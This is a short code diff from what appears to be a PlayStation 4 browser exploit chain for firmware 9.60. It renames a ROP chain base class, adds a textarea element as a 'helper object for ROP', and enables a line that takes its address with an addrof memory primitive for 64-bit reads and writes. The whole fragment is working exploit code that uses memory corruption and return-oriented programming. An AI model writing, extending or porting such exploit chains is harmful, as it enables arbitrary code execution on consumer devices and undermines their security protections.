@@ -219,7 +219,10 @@ function init_gadget_map(gadget_map, offset_map, base_addr) {
     }
 }
 
-class Chain950Base extends ChainBase {
+// helper object for ROP
+const rop_ta = document.createElement('textarea');
+
+class Chain960Base extends ChainBase {
     constructor() {
         super();
 
@@ -467,7 +470,7 @@ class Chain950Base extends ChainBase {
 }
 
 // Chain for PS4 9.60
-class Chain950 extends Chain950Base {
+class Chain950 extends Chain960Base {
     constructor() {
         super();
 
@@ -485,7 +488,7 @@ class Chain950 extends Chain950Base {
         const ta_clone = {};
         this.ta_clone = ta_clone;
         const clone_p = mem.addrof(ta_clone);
-        //const ta_p = mem.addrof(rop_ta);
+        const ta_p = mem.addrof(rop_ta);
 
         for (let i = js_size; i < js_ta_size; i += 8) {
             clone_p.write64(i, ta_p.read64(i));
